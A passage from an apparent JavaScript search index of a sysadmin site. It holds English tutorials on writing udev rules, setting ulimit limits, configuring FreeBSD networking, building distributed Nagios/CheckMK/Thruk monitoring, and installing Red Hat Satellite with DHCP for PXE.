                content: "Introduction linkudev is a device manager that replaces devfs on Linux kernels series 2.6. Its main function is to manage devices in the /dev directory.\nudev runs in user mode and communicates with hotplug which runs in kernel mode. It uses and stores information it has discovered in /sys. When hardware is detected, udev can assign a device name, create symbolic links, or execute a program when an action occurs on one or more devices.\nudev has an open socket on the machine, and the kernel informs udev of new devices through this socket.\nHere’s how udev works:\nThe kernel discovers a device and sends its status to sysfs udev is informed of this new event via a netlink socket udev creates the device (/dev/device) and/or launches a program (defined in udev rules) udev informs hald (Hardware Abstraction Layer Daemon) of this event via a socket The HAL (Hardware Abstraction) retrieves information about this device The HAL builds object structures related to the device with information retrieved previously and via other resources The HAL broadcasts events through D-Bus A userland application watches for this type of event to process the information afterward Usage linkThere isn’t much to do with udev for normal operation since it’s generally correctly configured by your Linux distribution. However, you may want to play with it and customize your system a bit.\nMonitoring linkYou can monitor udev by using the ‘udevmonitor’ command. For example, if I want to monitor when I connect my iPhone:\n\u003e udevmonitor --env udevmonitor prints the received event from the kernel [UEVENT] and the event which udev sends out after rule processing [UDEV] UEVENT[1330349745.773910] add@/devices/pci0000:00/0000:00:1a.7/usb1/1-6 ACTION=add DEVPATH=/devices/pci0000:00/0000:00:1a.7/usb1/1-6 SUBSYSTEM=usb SEQNUM=1077 PHYSDEVBUS=usb PHYSDEVDRIVER=usb ... DEVNAME=/dev/usbdev1.7_ep83 UDEV [1330349746.567644] add@/class/usb_device/usbdev1.7 UDEV_LOG=3 ACTION=add DEVPATH=/class/usb_device/usbdev1.7 SUBSYSTEM=usb_device SEQNUM=1083 PHYSDEVPATH=/devices/pci0000:00/0000:00:1a.7/usb1/1-6 PHYSDEVBUS=usb PHYSDEVDRIVER=usb MAJOR=189 MINOR=6 UDEVD_EVENT=1 DEVNAME=/dev/bus/usb/001/007 The Rules linkThe udev rules are defined in /etc/udev/rules.d, which means you can customize them or create your own rules.\n# The initial syslog(3) priority: \"err\", \"info\", \"debug\" or its # numerical equivalent. For runtime debugging, the daemons internal # state can be changed with: \"udevadm control --log-priority=\". udev_log=\"err\" Here are the udev.conf configuration file options:\nudev_root: where devices should be created (/dev) udev_rules: where the rules are (/etc/udev/rules.d/*.rules) udev_log: defines the verbosity level Creating Your Rules linkWe’ll create a file with the “.rules” extension to be taken into account by udev (/etc/udev/rules.d/*.rules), in the form:\nvalue, value, value which can correspond to something like:\nPROGRAM==\"script_to_run\" RESULT==\"what_should_be_returned_by_PROGRAM_for_validation\" Here’s an example:\nBUS==\"usb\", SYSFS{product}=\"iPhone\", SYMLINK+=\"iphone\" I ask udev that when it detects an iPhone on a USB port, it automatically creates a symbolic link in /dev called /dev/iphone.\nTo find information on which we can build our udev rules, we must first retrieve information about the hardware. First, let’s get the information (DEVNAME) on the path of the device we know using monitoring:\n\u003e udevinfo -q path -n /dev/bus/usb/001/007 /class/usb_device/usbdev1.7 This command gave us the path in /sys and we’ll use it now to get all available information:\n\u003e udevinfo -a -p /class/usb_device/usbdev1.7 Udevinfo starts with the device specified by the devpath and then walks up the chain of parent devices. It prints for every device found, all possible attributes in the udev rules key format. A rule to match, can be composed by the attributes of the device and the attributes from one single parent device. looking at device '/class/usb_device/usbdev1.7': KERNEL==\"usbdev1.7\" SUBSYSTEM==\"usb_device\" SYSFS{dev}==\"189:6\" looking at parent device '/devices/pci0000:00/0000:00:1a.7/usb1/1-6': ID==\"1-6\" BUS==\"usb\" DRIVER==\"usb\" SYSFS{configuration}==\"PTP\" SYSFS{serial}==\"8603c60e01995bb89ca2cb39570f9bb1039454df\" SYSFS{product}==\"iPhone\" SYSFS{manufacturer}==\"Apple Inc.\" SYSFS{maxchild}==\"0\" SYSFS{version}==\" 2.00\" SYSFS{devnum}==\"7\" SYSFS{speed}==\"480\" SYSFS{bMaxPacketSize0}==\"64\" SYSFS{bNumConfigurations}==\"4\" ... I’ve just obtained the information that interested me about my device.\nWe’ll tell udev to reload its rules so it takes our new rule into account (without having to reboot the machine):\nudevcontrol reload_rules Or depending on the OS version, this also works:\nudevadm control --reload-rules With iSCSI linkWhen using iSCSI, you can retrieve information like this:\n\u003e scsi_id -g -x -s /block/sda ID_VENDOR=ATA ID_MODEL=WDC_WD1600AAJS-6 ID_REVISION=58.0 ID_SERIAL=SATA_WDC_WD1600AAJS-_WD-WMAS20873789 ID_TYPE=disk ID_BUS=scsi The equivalents for USB or ATA are:\n/lib/udev/ata_id /dev/hdx /lib/udev/usb_id /dev/sdx Explanations on Creating Rules linkNow, you might say that’s fine, but you haven’t explained much about how to construct these rules! Let’s detail this (largely thanks to the man page).\nMatching Keys linkThere are operators for defining udev matching rules, and these are designed to match device properties (some of these properties match the parent device in sysfs):\nDescription Operator Compare for equality == Compare for inequality != Assign a value to a key. Keys that represent a list, are reset and only this single value is assigned = Add the value to a key that holds a list of entries += Assign a value to a key finally; disallow any later changes, which may be used to prevent changes by any later rules := And here are the elements that can be used for matching:\nDescription Operator Match the name of the event action ACTION Match the name of the device KERNEL Match the devpath of the device DEVPATH Match the subsystem of the device SUBSYSTEM Match the name of the event action ACTION Search the devpath upwards for a matching device subsystem name BUS Search the devpath upwards for a matching device driver name DRIVER Search the devpath upwards for a matching device name ID Search the devpath upwards for a device with matching sysfs attribute values. Up to five SYSFS keys can be specified per rule. All attributes must match on the same device. Trailing whitespace in the attribute values is ignored, if the specified match value does not contain trailing whitespace itself. SYSFS{filename} Match against the value of an environment variable. Up to five ENV keys can be specified per rule. This key can also be used to export a variable to the environment. ENV{key} Execute external program. The key is true, if the program returns without exit code zero. The whole event environment is available to the executed program. The program’s output printed to stdout is available for the RESULT key PROGRAM Match the returned string of the last PROGRAM call. This key can be used in the same or in any later rule after a PROGRAM call RESULT You can use matching patterns for your correspondences:\nDescription Operator Matches zero, or any number of characters * Matches any single character ? Matches any single character specified within the brackets. For example, the pattern string ’tty[SR]’ would match either ’ttyS’ or ’ttyR’. Ranges are also supported within this match with the ‘-’ character. For example, to match on the range of all digits, the pattern [0-9] would be used. If the first character following the ‘[’ is a ‘!’, any characters not enclosed are matched [] Rules on Key Assignment linkHere are the solutions for values:\nDescription Operator The name, a network interface should be renamed to. Or as a temporary workaround, the name a device node should be named. Usually the kernel provides the defined node name, or even creates and removes the node before udev even receives any event. Changing the node name from the kernel’s default creates inconsistencies and is not supported. If the kernel and NAME specify different names, an error will be logged. Udev is only expected to handle device node permissions and to create additional symlinks, not to change kernel-provided device node names. Instead of renaming a device node, SYMLINK should be used. Symlink names must never conflict with device node names, it will result in unpredictable behavior NAME The name of a symlink targeting the node. Every matching rule will add this value to the list of symlinks to be created. Multiple symlinks may be specified by separating the names by the space character. In case multiple devices claim the same name, the link will always point to the device with the highest link_priority. If the current device goes away, the links will be re-evaluated and the device with the next highest link_priority will own the link. If no link_priority is specified, the order of the devices, and which one of them will own the link, is undefined. Claiming the same name for a symlink, which is or might be used for a device node, may result in unexpected behavior and is not supported SYMLINK The permissions for the device node. Every specified value overwrites the compiled-in default value OWNER, GROUP, MODE The value that should be written to a sysfs attribute of the event device ATTR{key} Set a device property value. Property names with a leading ‘.’ are not stored in the database or exported to external tool or events ENV{key} Attach a tag to a device. This is used to filter events for users of libudev’s monitor functionality, or to enumerate a group of tagged devices. The implementation can only work efficiently if only a few tags are attached to a device. It is only meant to be used in contexts with specific device filter requirements, and not as a general-purpose flag. Excessive use might result in inefficient event handling TAG Add a program to the list of programs to be executed for a specific device. This can only be used for very short running tasks. Running an event process for a long period of time may block all further events for this or a dependent device. Long running tasks need to be immediately detached from the event process itself. If the option RUN{fail_event_on_error} is specified, and the executed program returns non-zero, the event will be marked as failed for a possible later handling. If no absolute path is given, the program is expected to live in /lib/udev, otherwise the absolute path must be specified. Program name and arguments are separated by spaces. Single quotes can be used to specify arguments with spaces RUN Named label where a GOTO can jump to LABEL Jumps to the next LABEL with a matching name GOTO Import a set of variables as device properties, depending on type: program: Execute an external program specified as the assigned value and import its output, which must be in environment key format. Path specification, command/argument separation, and quoting work like in RUN. file: Import a text file specified as the assigned value, which must be in environment key format. db: Import a single property specified as the assigned value from the current device database. This works only if the database is already populated by an earlier event. cmdline: Import a single property from the kernel commandline. For simple flags the value of the property will be set to ‘1’. parent: Import the stored keys from the parent device by reading the database entry of the parent device. The value assigned to IMPORT{parent} is used as a filter of key names to import (with the same shell-style pattern matching used for comparisons). If no option is given, udev will choose between program and file based on the executable bit of the file permissions IMPORT{type} Wait for a file to become available or until a 10 seconds timeout expires. The path is relative to the sysfs device, i.e. if no path is specified this waits for an attribute to appear WAIT_FOR Rule and device options: link_priority=value: Specify the priority of the created symlinks. Devices with higher priorities overwrite existing symlinks of other devices. The default is 0. event_timeout=Number of seconds an event will wait for operations to finish, before it will terminate itself. string_escape=none replace: Usually control and other possibly unsafe characters are replaced in strings used for device naming. The mode of replacement can be specified with this option. static_node=: Apply the permissions specified in this rule to a static device node with the specified name. Static device nodes might be provided by kernel modules, or copied from /lib/udev/devices. These nodes might not have a corresponding kernel device at the time udevd is started, and allow to trigger automatic kernel module on-demand loading. watch: Watch the device node with inotify, when closed after being opened for writing, a change uevent will be synthesised. nowatch: Disable the watching of a device node with inotify. Substitution Rules linkThe NAME, SYMLINK, PROGRAM, OWNER, GROUP, MODE and RUN fields support substitution rules. These are built-in to help you set certain variables:\nDescription Operator The kernel name for this device $kernel, %k The kernel number for this device. For example, ‘sda3’ has kernel number of ‘3’ $number, %n The devpath of the device $devpath, %p The name of the device matched while searching the devpath upwards for SUBSYSTEMS, KERNELS, DRIVERS and ATTRS. $id, %b The driver name of the device matched while searching the devpath upwards for SUBSYSTEMS, KERNELS, DRIVERS and ATTRS $driver The value of a sysfs attribute found at the device, where all keys of the rule have matched. If the matching device does not have such an attribute, and a previous KERNELS, SUBSYSTEMS, DRIVERS, or ATTRS test selected a parent device, use the attribute from that parent device. If the attribute is a symlink, the last element of the symlink target is returned as the value $attr{file}, %s{file} A device property value $env{key}, %E{key} The kernel major number for the device $major, %M The kernel minor number for the device $minor, %m The string returned by the external program requested with PROGRAM. A single part of the string, separated by a space character may be selected by specifying the part number as an attribute: %c{N}. If the number is followed by the ‘+’ char this part plus all remaining parts of the result string are substituted: %c{N+} $result, %c The node name of the parent device $parent, %P The current name of the device node. If not changed by a rule, it is the name of the kernel device $name The current list of symlinks, separated by a space character. The value is only set if an earlier rule assigned a value, or during a remove events $links The udev_root value $root, %r The sysfs mount point $sys, %S The name of a created temporary device node to provide access to the device from a external program before the real node is created $tempnode, %N The ‘%’ character itself %% The ‘$’ character itself $$ Examples linkHere’s a small list of examples to help you build rules:\nThis always maps a specific USB device (in this case, a pendrive) to /dev/usbpen, which is then set in fstab to mount on /mnt/usbpen:\n# Symlink USB pen SUBSYSTEMS==\"usb\", ATTRS{serial}==\"1730C13B18000B84\", KERNEL==\"sd?\", NAME=\"%k\", SYMLINK+=\"usbpen\", GROUP=\"storage\" SUBSYSTEMS==\"usb\", ATTRS{serial}==\"1730C13B18000B84\", KERNEL==\"sd?1\", NAME=\"%k\", SYMLINK+=\"usbpen\", GROUP=\"storage\" For devices with multiple partitions, the following example maps the device to /dev/usbdisk, and partitions 1, 2, 3 etc., to /dev/usbdisk1, /dev/usbdisk2, /dev/usbdisk3, etc.\n# Symlink multi-part device SUSSYSTEMS==\"usb\", ATTRS{serial}==\"1730C13B18000B84\", KERNEL==\"sd?\", NAME=\"%k\", SYMLINK+=\"usbdisk\", GROUP=\"storage\" SUBSYSTEMS==\"usb\", ATTRS{serial}==\"1730C13B18000B84\", KERNEL==\"sd?[1-9]\", NAME=\"%k\", SYMLINK+=\"usbdisk%n\", GROUP=\"storage\" The above rules are equivalent to the following one:\n# Symlink multi-part device SUBSYSTEMS==\"usb\", ATTRS{serial}==\"1730C13B18000B84\", KERNEL==\"sd*\", NAME=\"%k\", SYMLINK+=\"usbdisk%n\", GROUP=\"storage\" It’s also possible to omit the NAME and GROUP statements, so that the defaults from udev.rules are used. The shortest and simplest solution would be adding this rule:\n# Symlink multi-part device SUBSYSTEMS==\"usb\", ATTRS{serial}==\"1730C13B18000B84\", KERNEL==\"sd*\", SYMLINK+=\"usbdisk%n\" This always maps an Olympus digicam to /dev/usbcam, which can be stated in fstab to mount on /mnt/usbcam:\n# Symlink USB camera SUBSYSTEMS==\"usb\", ATTRS{serial}==\"000207532049\", KERNEL==\"sd?\", NAME=\"%k\", SYMLINK+=\"usbcam\", GROUP=\"storage\" SUBSYSTEMS==\"usb\", ATTRS{serial}==\"000207532049\", KERNEL==\"sd?1\", NAME=\"%k\", SYMLINK+=\"usbcam\", GROUP=\"storage\" And this maps a Packard Bell MP3 player to /dev/mp3player:\n# Symlink MP3 player SUBSYSTEMS==\"usb\", ATTRS{serial}==\"0002F5CF72C9C691\", KERNEL==\"sd?\", NAME=\"%k\", SYMLINK+=\"mp3player\", GROUP=\"storage\" SUBSYSTEMS==\"usb\", ATTRS{serial}==\"0002F5CF72C9C691\", KERNEL==\"sd?1\", NAME=\"%k\", SYMLINK+=\"mp3player\", GROUP=\"storage\" To map a selected USB key to /dev/mykey and all other keys to /dev/otherkey:\n# Symlink USB keys SUBSYSTEMS==\"usb\", ATTRS{serial}==\"insert serial key\", KERNEL==\"sd?1\", NAME=\"%k\", SYMLINK+=\"mykey\" SUBSYSTEMS==\"usb\", KERNEL==\"sd?1\", NAME=\"%k\", SYMLINK+=\"otherkey\" Note the order of the lines. Since all USB keys should create the /dev/sd node, udev will first check if it is a rules-stated USB key, defined by serial number. But if an unknown USB key is plugged, it will also create a node, using the previously stated generic name, “otherkey”. That rule should be the last one in the rules file so that it does not override the others.\nThis is an example on how to distinguish USB HDD drives and USB sticks:\nBUS==\"usb\", ATTRS{product}==\"USB2.0 Storage Device\", KERNEL==\"sd?\", NAME=\"%k\", SYMLINK+=\"usbdisk\", GROUP=\"storage\" BUS==\"usb\", ATTRS{product}==\"USB2.0 Storage Device\", KERNEL==\"sd?[1-9]\", NAME=\"%k\", SYMLINK+=\"usbdisk%n\", GROUP=\"storage\" BUS==\"usb\", ATTRS{product}==\"USB Mass Storage Device\", KERNEL==\"sd?1\", NAME=\"%k\", SYMLINK+=\"usbflash\", GROUP=\"storage\" Resources linkhttp://reactivated.net/writing_udev_rules.html\nhttp://www.redhat.com/magazine/002dec04/features/udev/\nhttp://wiki.debian.org/udev\nhttps://wiki.archlinux.org/index.php/Map_Custom_Device_Entries_with_udev\n"
            }
        );
    index.add(
            {
                id:  315 ,
                href: "\/Ulimit_:_Utiliser_les_limites_syst%C3%A8mes\/",
                title: "Ulimit: Using System Limits",
                description: "An overview of how to use ulimit to manage system-wide resource limits for users and processes on Linux and Solaris systems.",
                content: "Introduction linkThe ulimit programs allow to limit system-wide resource use using a normal configuration file - /etc/security/limits.conf. This can help a lot in system administration, e.g. when a user starts too many processes and therefore makes the system unresponsive for other users.\nUsage linkLinux link ulimit -a core file size (blocks, -c) 0 data seg size (kbytes, -d) unlimited scheduling priority (-e) 0 file size (blocks, -f) unlimited pending signals (-i) 7671 max locked memory (kbytes, -l) 64 max memory size (kbytes, -m) 811664 open files (-n) 1024 pipe size (512 bytes, -p) 8 POSIX message queues (bytes, -q) 819200 real-time priority (-r) 0 stack size (kbytes, -s) 8192 cpu time (seconds, -t) unlimited max user processes (-u) 7671 virtual memory (kbytes, -v) 1175120 file locks (-x) unlimited All these settings can be manipulated. A good example is this forkbomb that forks as many processes as possible and can crash systems where no user limits are set\nNow this is not good - any user with shell access to your box could take it down. But if that user can only start 20 processes the damage will be minimal. So let’s set a process limit of MAX 20 process for a particular users in the system, this can be done by inserting the simple one line in limit.conf file.\nFollowing will prevent a “fork bomb” (/etc/security/limits.conf):\ndeimos hard nproc 20 @group1 hard nproc 50 Above will prevent user “deimos” to create more than 20 process and anyone in the group1 from having more than 50 processes.\nThere are many more setting and limits that you can set on a particular user or to a entire group like..\nUsing below configuration will prevent any users in the system to logins not more than 3 places at same time (/etc/security/limits.conf):\nhard maxlogins 3 Limit on size of core file (/etc/security/limits.conf):\nhard core 0 Solaris linkTo get all information:\nulimit -a To display a process’ current file descriptor limit, run:\n/usr/proc/bin/pfiles pid Remove the grep to see all files linked to a process.\nTo change the files descriptor for example:\nulimit -n 1024 "
            }
        );
    index.add(
            {
                id:  316 ,
                href: "\/Configurer_le_r%C3%A9seau_sous_FreeBSD\/",
                title: "Configuring Network on FreeBSD",
                description: "A guide to network configuration on FreeBSD, including interface configuration, static IP settings, DHCP, routing, and more",
                content: " Operating System FreeBSD 9 Website FreeBSD Website Last Update 02/07/2012 Introduction linkThe network is an essential part of system configuration, so I’ll cover some aspects of it here.\nConfiguration linkDisplay Interfaces and Associated IPs linkThe command is always the same:\nifconfig Declare Interfaces linkWe can declare the interfaces to manage at startup by simply listing the interfaces separated by spaces:\n# Network network_interfaces=\"lo0 vr0 vr1 vr2\" ifconfig_lo0=\"inet 127.0.0.1\" Here I’ve declared 4 interfaces and configured lo0.\nDHCP linkIf you want to set an interface to use DHCP, it’s very simple:\n# Network ifconfig_vr0=\"DHCP\" Here my vr0 interface is configured with DHCP.\nStatic IPs linkIf you want to set a static IP address to an interface, it’s very simple:\n# Network ifconfig_vr0=\"inet 192.168.10.254 netmask 255.255.255.0\" Here my vr0 interface is configured with a static IP.\nDefault Gateway linkTo configure the default gateway:\n# Network defaultrouter=\"192.168.10.138\" Display Routes linkTo display routes:\nnetstat -rn Add a Route linkTo add a route, simply define one or more route names and define them line by line:\nstatic_routes=\"route1 route2\" route_route1=\"-net 222.2.90.0/24 222.2.30.1\" route_route2=\"-net 222.2.100.0/24 222.2.30.1\" Restart Network Services linkTo restart network services:\n/etc/rc.d/netif restart And for routing services:\n/etc/rc.d/routing restart References linkhttp://www.freebsd.org/doc/fr/articles/ppp/chap3.html\nhttp://www.cyberciti.biz/faq/freebsd-setup-default-routing-with-route-command/\n"
            }
        );
    index.add(
            {
                id:  317 ,
                href: "\/Mise_en_place_dune_solution_de_monitoring_%C3%A9clat%C3%A9_avec_Nagios_CheckMK_et_Thruk\/",
                title: "Setting up a distributed monitoring solution with Nagios, CheckMK and Thruk",
                description: "How to set up a distributed monitoring solution with Nagios, CheckMK and Thruk to create a centralized monitoring dashboard for multiple Nagios servers.",
                content: " Software version Nagios 3\nCheck Mk 1.1.12p7\nThruk 1.30 Operating System Debian 6 Last Update 28/06/2012 Introduction linkBefore starting with this documentation, it’s recommended to be familiar with certain tools. Here’s the list with associated documentation:\nNagios Check Mk Thruk The purpose of this documentation is to install a Thruk server capable of displaying information from different remote Nagios servers:\nThis diagram will be our reference throughout the tutorial.\nWe will need 4 servers with the following services installed:\nSRV-THRUK: Apache \u0026 Thruk which will be our “display” server. SRV-NAGIOS1: Nagios \u0026 Check Mk which will be a Nagios server to monitor part x of our infrastructure SRV-NAGIOS2: Nagios \u0026 Check Mk which will be a Nagios server to monitor part y of our infrastructure SRV-NAGIOS3: Nagios \u0026 Check Mk which will be a Nagios server to monitor part z of our infrastructure In the end, we want to get decentralized screens without any dependency between them:\nThruk: Display Server linkInstallation linkLet’s start with the installation of Apache2\naptitude install apache2 Now that Apache2 is installed, let’s download Thruk:\ndpkg -i thruk_version.deb apt-get -f install You can now access your Thruk interface by typing this in your browser: http://localhost/thruk\nThe login and password are: thrukadmin\nConfiguration linkThe Thruk configuration is primarily initialized by two files:\nthruk.conf: This is the global Thruk configuration that should not be modified! thruk_local.conf: This is the customizable configuration, which will be loaded by thruk.conf Let’s edit our /etc/thruk/thruk_local.conf as follows:\n#First remote Nagios name = srv-nagios1 #Connection name, this name will be displayed on Thruk type = livestatus #Connection type peer = 192.168.0.37:6557 #IP address of the Nagios server and port used by livestatus (ref. 2-Configuration) #Second remote Nagios name = srv-nagios2 type = livestatus peer = 192.168.0.27:6557 #Third remote Nagios name = srv-nagios3 type = livestatus peer = 192.168.0.162:6557 To finish, just start the Thruk service:\nservice thruk start The configuration of our SRV-THRUK doesn’t require any other modifications in our case, so we can move on to the installation of the Nagios and CheckMK servers.\nNagios \u0026 CheckMk: Monitoring Servers linkInstallation linkFirst, let’s take care of Nagios3:\naptitude install nagios3 Then the famous plugin for Nagios, Check Mk:\naptitude install xinetd gcc g++ libc6-dev make libapache2-mod-python #Required dependencies wget http://mathias-kettner.de/download/check_mk-1.2.0p1.tar.gz #Download check_mk tar -zvxf check_mk-version.tar cd check_mk-version/ ./setup.sh Use the setup with default options. If needed, refer to the CheckMk documentation for more information. Then install the agent:\nwget http://mathias-kettner.de/download/check-mk-agent_1.2.0p1-2_all.deb dpkg -i check-mk-agent_version.deb Configuration linkThe livestatus file is essential in our implementation, as it’s where we specify the port used by livestatus, the IP address of our remote Thruk server and the path of the socket used.\nUse the following example for the /etc/xinetd.d/livestatus file. This livestatus file needs to be created, be careful not to insert comments in the configuration file:\nservice livestatus { type = UNLISTED port = 6557 #Port used by the livestatus service =\u003e thruk_local.conf socket_type = stream protocol = tcp wait = no cps = 100 3 instances = 500 per_source = 250 flags = NODELAY user = nagios server = /usr/bin/unixcat server_args = /var/lib/nagios3/rw/live #Path of the socket used only_from = 192.168.0.190 #IP address of our SRV-THRUK disable = no } Finally, we need to restart our service:\n/etc/init.d/xinetd restart Let’s create the directory containing the socket (live), and assign it permissions:\nmkdir -p /var/lib/nagios3/rw/ touch /var/lib/nagios3/rw/live chown -Rf nagios. /var/lib/nagios3 We also need to edit the Nagios configuration to enter the path of our socket\nThe file to edit is /etc/nagios3/nagios.cfg:\n# Load Livestatus Modulebroker_module=/usr/lib/check_mk/livestatus.o /var/lib/nagios3/rw/live #Path corresponding to our socket event_broker_options=-1 Restart Nagios3\n/etc/init.d/nagios3 restart If you want to test your socket and retrieve information from it:\necho 'GET services' | unixcat /var/lib/nagios3/rw/live echo 'GET hosts' | unixcat /var/lib/nagios3/rw/live "
            }
        );
    index.add(
            {
                id:  318 ,
                href: "\/Satellite_:_D%C3%A9ploiement_d%27OS_Red_Hat_via_Red_Hat_Satellite\/",
                title: "Satellite: Deploying Red Hat OS via Red Hat Satellite",
                description: "Guide for deploying and managing Red Hat operating systems through Red Hat Satellite, including installation, configuration, and repository management.",
                content: " Software version 5.4.1 Operating System RHEL 6.2 Website Red Hat Website Last Update 22/06/2012 Introduction linkA Red Hat Satellite server is a solution that allows you to automatically deploy Red Hat OS via PXE/DHCP. You can then manage different installation profiles, manage updates, and perform a variety of simplified administrative tasks.\nIf you don’t have the money or simply want to create a lab, you can use its free equivalent: Spacewalk (hence the logo).\nPrerequisites linkHave a local Red Hat DVD repository or direct access to the RHN (this is ideal, as you’ll need it anyway).\nPackages linkBefore starting, we need to verify that we have installed the necessary components:\nyum groupinstall base yum install syslinux Base: minimum required for Satellite installation syslinux: necessary for PXE Hostname linkMake sure to properly set the hostname and associated IP (adapt to your configuration):\necho \"x.x.x.x satellite-master.deimos.fr satellite-master\" \u003e\u003e /etc/hosts echo \"satellite-master.deimos.fr\" \u003e /proc/sys/kernel/hostname service network restart Disable SELinux linkFor the installation, the simplest approach is to temporarily disable the SELinux service:\nsetenforce 0 It is then recommended to leave it disabled (see the documentation for persistence)\nSysctl linkLet’s enable IP forwarding:\necho \"net.ipv4.ip_forward=1\" \u003e\u003e /etc/sysctl.conf sysctl -p DNS linkMake sure that all future clients (as well as the server) have access to the DNS server!!! In our case, the server will be called ‘satellite-master’, and it’s very important that it remains accessible by any server with this name, otherwise PXE will not work.\nInstallation linkSatellite Master linkTo install it, it’s quite simple - there’s an installer that does everything. However, you’ll need the Red Hat DVD for dependencies (I recommend a local repository), and to copy the Satellite installer locally (/home/sat in my case).\nNote: use the ‘–disconnected’ option if you are behind a proxy during installation.\nThen we’ll simply launch the installation:\n\u003e /home/sat/install.pl * Starting the Red Hat Network Satellite installer. * Performing pre-install checks. * Pre-install checks complete. Beginning installation. * RHN Registration. ** Registration: Disconnected mode. Not registering with RHN. * Checking for uninstalled prerequisites. ** Checking if yum is available ... There are some packages from Red Hat Enterprise Linux that are not part of the @base group that Satellite will require to be installed on this system. The installer will try resolve the dependencies automatically. However, you may want to install these prerequisites manually. Do you want the installer to resolve dependencies [y/N]? y We answer ‘y’ to this question so it installs the necessary packages automatically.\nWe’ll wait a bit and then provide the email and certificate:\n* Applying updates. * Installing RHN packages. Warning: more packages were installed by yum than expected: cdparanoia-libs cups cvs foomatic foomatic-db foomatic-db-filesystem foomatic-db-ppds gdb gettext ghostscript ghostscript-fonts gstreamer gstreamer-plugins-base gstreamer-tools iso-codes java-1.5.0-gcj java_cup lcms-libs libICE libSM libXfont libXt libXv libXxf86vm libfontenc libgomp libmng libogg liboil libtheora libvisual libvorbis mailcap make mesa-dri-drivers mesa-libGL mesa-libGLU openjpeg-libs patch pax perl-CGI perl-Compress-Raw-Zlib perl-Error perl-ExtUtils-MakeMaker perl-ExtUtils-ParseXS perl-IO-Compress-Base perl-IO-Compress-Zlib perl-Test-Harness perl-Test-Simple perl-YAML-Syck perl-devel phonon-backend-gstreamer poppler poppler-data poppler-utils portreserve python-setuptools qt qt-sqlite qt-x11 qt3 redhat-lsb redhat-lsb-graphics redhat-lsb-printing sinjdoc urw-fonts xml-common xorg-x11-font-utils Warning: yum did not install the following packages: libXpm * Now running spacewalk-setup. * Setting up Oracle environment. * Setting up database. ** Database: Installing the database: ** Database: This is a long process that is logged in: ** Database: /var/log/rhn/install_db.log *** Progress: ############################ ** Database: Installation complete. ** Database: Setting up database connection for Oracle backend. ** Database: Testing database connection. ** Database: Populating database. *** Progress: ######################################################### * Setting up users and groups. ** GPG: Initializing GPG and importing key. ** GPG: Creating /root/.gnupg directory You must enter an email address. Admin Email Address? deimos@deimos.fr * Performing initial configuration. * Activating RHN Satellite. Where is your satellite certificate file? /root/deimos.cert We’ll answer ‘y’ to this question:\n** Loading RHN Satellite Certificate. ** Verifying certificate locally. ** Activating RHN Satellite. * Enabling Monitoring. * Configuring apache SSL virtual host. Should setup configure apache's default ssl server for you (saves original ssl.conf) [Y]? y Enter a password for the certificate:\n** /etc/httpd/conf.d/ssl.conf has been backed up to ssl.conf-swsave * Configuring tomcat. ** /etc/tomcat6/tomcat6.conf has been backed up to tomcat6.conf-swsave ** /etc/tomcat6/server.xml has been backed up to server.xml-swsave ** /etc/tomcat6/web.xml has been backed up to web.xml-swsave * Configuring jabberd. * Creating SSL certificates. CA certificate password? Re-enter CA certificate password? The certificate information:\n** /etc/httpd/conf.d/ssl.conf has been backed up to ssl.conf-swsave * Configuring tomcat. ** /etc/tomcat6/tomcat6.conf has been backed up to tomcat6.conf-swsave ** /etc/tomcat6/server.xml has been backed up to server.xml-swsave ** /etc/tomcat6/web.xml has been backed up to web.xml-swsave * Configuring jabberd. * Creating SSL certificates. CA certificate password? Re-enter CA certificate password? Organization? deimos Organization Unit [satellite-master.deimos.fr]? Email Address [deimos@deimos.fr]? City? Paris State? IDF Country code (Examples: \"US\", \"JP\", \"IN\", or type \"?\" to see a list)? FR ** SSL: Generating CA certificate. ** SSL: Deploying CA certificate. ** SSL: Generating server certific ** SSL: Storing SSL certificates. * Deploying configuration files. * Update configuration in database. * Setting up Cobbler.. Cobbler requires tftp and xinetd services be turned on for PXE provisioning functionality. Enable these services [Y/n]?y cobblerd does not appear to be running/accessible * Restarting services. Installation complete. Visit https://satellite-master.deimos.fr to create the RHN Satellite administrator account. And the installation is complete. Now let’s update yum to install 2 missing packages:\n\u003e yum update Loaded plugins: product-id, security, subscription-manager Updating certificate-based repositories. Setting up Update Process Resolving Dependencies --\u003e Running transaction check ---\u003e Package python-netaddr.noarch 0:0.7.5-3.el6 will be updated ---\u003e Package python-netaddr.noarch 0:0.7.5-4.el6 will be an update --\u003e Finished Dependency Resolution Dependencies Resolved ============================================================================================================================================================================================================================================================================== Package Arch Version Repository Size ============================================================================================================================================================================================================================================================================== Updating: python-netaddr noarch 0.7.5-4.el6 dvd_repo 1.0 M Transaction Summary ============================================================================================================================================================================================================================================================================== Upgrade 1 Package(s) Total download size: 1.0 M Is this ok [y/N]: y Downloading Packages: Running rpm_check_debug Running Transaction Test Transaction Test Succeeded Running Transaction Warning: RPMDB altered outside of yum. Updating : python-netaddr-0.7.5-4.el6.noarch 1/2 Cleanup : python-netaddr-0.7.5-3.el6.noarch 2/2 Installed products updated. Updated: python-netaddr.noarch 0:0.7.5-4.el6 Complete! DHCP linkWe’re going to install a DHCP server to be able to push OS via PXE/TFTP (already done by the Satellite installer). If you already have a DHCP server, go directly to the configuration.\nDHCP Installation linkTo install a DHCP server on Red Hat:\nyum install dhcp Before modifying the configuration, we’ll copy a standard configuration:\ncp -f /usr/share/doc/dhcp-*/dhcpd.conf.sample /etc/dhcp/dhcpd.conf DHCP Configuration linkEdit the /etc/dhcp/dhcpd.conf file to add the desired configuration. Here I have 2 declared ranges. Each range has its own interface:\n# dhcpd.conf # # Sample configuration file for ISC dhcpd # # option definitions common to all supported networks... option domain-name \"deimos.fr\"; option domain-name-servers ns1.deimos.fr, ns2.deimos.fr; default-lease-time 600; max-lease-time 7200; # Use this to enble / disable dynamic dns updates globally. ddns-update-style none; allow booting; allow bootp; # If this DHCP server is the official DHCP server for the local # network, the authoritative directive should be uncommented. authoritative; # Use this to send dhcp log messages to a different log file (you also # have to hack syslog.conf to complete the redirection). log-facility local7; # No service will be given on this subnet, but declaring it helps the # DHCP server to understand the network topology. subnet 10.102.2.32 netmask 255.255.255.224 { option routers 10.102.2.63; option subnet-mask 255.255.255.224; option domain-name-servers 192.168.0.69; range 10.102.2.33 10.102.2.62; next-server 10.102.2.1; filename \"pxelinux.0\"; } subnet 10.102.2.64 netmask 255.255.255.224 { option routers 10.102.2.65; option subnet-mask 255.255.255.224; option domain-name-servers 192.168.0.69; range 10.102.2.66 10.102.2.94; next-server 10.102.2.1; filename \"pxelinux.0\"; } # This is a very basic subnet declaration. #subnet 